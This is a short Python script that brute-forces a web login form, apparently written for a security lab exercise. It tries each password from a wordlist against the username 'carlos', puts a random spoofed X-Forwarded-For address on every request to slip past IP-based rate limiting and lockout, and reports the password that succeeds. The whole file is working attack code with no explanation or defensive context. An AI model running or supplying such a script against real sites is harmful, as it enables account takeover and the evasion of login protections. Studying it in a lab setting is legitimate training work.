import requests
import random
import time

url = ""

with open("passwords.txt") as f:
    for line in f:
        password = line.strip()
        headers = {"X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"}
        response = requests.post(url, data={"username": "carlos", "password": password}, headers=headers)
        print(f"check: {password} | status: {response.status_code}")
        if response.status_code == 200 and "Incorrect password" not in response.text:
            print(f"find: {password}")
        time.sleep(0.3)